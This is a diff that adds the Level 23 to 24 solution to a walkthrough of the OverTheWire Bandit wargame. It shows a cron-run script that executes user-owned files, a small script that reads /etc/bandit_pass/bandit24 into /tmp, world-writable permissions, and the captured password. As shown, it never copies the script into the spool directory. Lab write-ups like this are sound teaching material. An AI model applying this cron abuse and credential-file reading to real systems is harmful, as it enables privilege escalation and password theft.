@@ -383,6 +383,64 @@ bandit22@bandit:/etc/cron.d$ echo "I am user bandit23" | md5sum | cut -d ' ' -f 
 bandit22@bandit:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
 jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
 ```
+## Level 23 - 24
+* A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
+```
+bandit23@bandit:~$ cd /etc/cron.d/
+bandit23@bandit:/etc/cron.d$ ls
+cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24
+cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root
+bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+```
+```
+bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+
+        fi
+        rm -f ./$i
+    fi
+done
+```
+```
+bandit23@bandit:~$ mkdir /tmp/meow
+bandit23@bandit:~$ cd /tmp/meow
+```
+```
+bandit23@bandit:/tmp/meow$ nano script.sh
+```
+```
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/meow/password
+```
+```
+bandit23@bandit:/tmp/meow$ chmod 777 -R /tmp/meow
+```
+```
+bandit23@bandit:/tmp/meow$ ls -l
+total 4
+-rwxrwxrwx 1 bandit23 bandit23 63 Nov  1 16:28 script.sh
+bandit23@bandit:/tmp/meow$ ls -l
+total 8
+-rw-r--r-- 1 bandit24 bandit24 33 Nov  1 16:30 password
+-rwxrwxrwx 1 bandit23 bandit23 63 Nov  1 16:28 script.sh
+bandit23@bandit:/tmp/meow$ cat password
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+```
 ## Reference 
 * [Overthewire Bandit Wargames walkthrough Series' Articles](https://dev.to/kkaosninja/series/1395)
 * [OverTheWire :- Bandit (Level 0–10) [CTF]](https://dev.to/shubham2503/overthewire-bandit-level-0-10-ctf-4mli)
